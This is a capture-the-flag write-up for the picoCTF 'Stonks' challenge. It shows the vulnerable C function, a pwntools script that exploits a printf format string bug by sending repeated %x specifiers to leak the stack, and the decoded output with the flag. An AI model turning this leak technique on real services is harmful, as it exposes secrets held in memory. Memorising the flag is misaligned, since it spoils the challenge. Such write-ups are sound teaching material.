# picoCTF Stonks Write Up

## Details:
Points: 20

Jeopardy style CTF

Category: Binary Exploitation

Comments: I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 53437

## Write up:

Looking through vuln.c we find an interesting function:

```python
int buy_stonks(Portfolio *p) {
	if (!p) {
		return 1;
	}
	char api_buf[FLAG_BUFFER];
	FILE *f = fopen("api","r");
	if (!f) {
		printf("Flag file not found. Contact an admin.\n");
		exit(1);
	}
	fgets(api_buf, FLAG_BUFFER, f);

	int money = p->money;
	int shares = 0;
	Stonk *temp = NULL;
	printf("Using patented AI algorithms to buy stonks\n");
	while (money > 0) {
		shares = (rand() % money) + 1;
		temp = pick_symbol_with_AI(shares);
		temp->next = p->head;
		p->head = temp;
		money -= shares;
	}
	printf("Stonks chosen\n");

	// TODO: Figure out how to read token from file, for now just ask

	char *user_buf = malloc(300 + 1);
	printf("What is your API token?\n");
	scanf("%300s", user_buf);
	printf("Buying stonks with token:\n");
	printf(user_buf);

	// TODO: Actually use key to interact with API

	view_portfolio(p);

	return 0;
}
```

This function reads the flag onto the stack and then asks the user to enter input before printing it using printf. Based on this we know that this is a format string vulnerability and that we want to read off of the stack.

I then wrote the following script to connect to the server and send lots of %x (prints stack) before reading and parsing that to ascii:

```python
# import pwntools
from pwn import *

# string to write to
s = ""

# open up remote connection
r = remote('mercury.picoctf.net', 53437)

# get to vulnerability
r.recvuntil("View my")
r.send("1\n")
r.recvuntil("What is your API token?\n")

# send string to print stack
r.send("%x" + "-%x"*40 + "\n")

# receive until the line we want
r.recvline()

# read in line
x = r.recvline()

# remove unwanted components
x = x[:-1].decode()

# parse to characters
for i in x.split('-'):
	if len(i) == 8:
		a = bytearray.fromhex(i)

		for b in reversed(a):
			if b > 32 and b < 128:
				s += chr(b)

# print string
print(s)
```

When run this program prints:

```
Opening connection to mercury.picoctf.net on port 53437: Done
M!MpicoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}@$0E@x%Eo
```

And the flag was:

```
picoCTF{I_l05t_4ll_my_m0n3y_bdc425ea}
```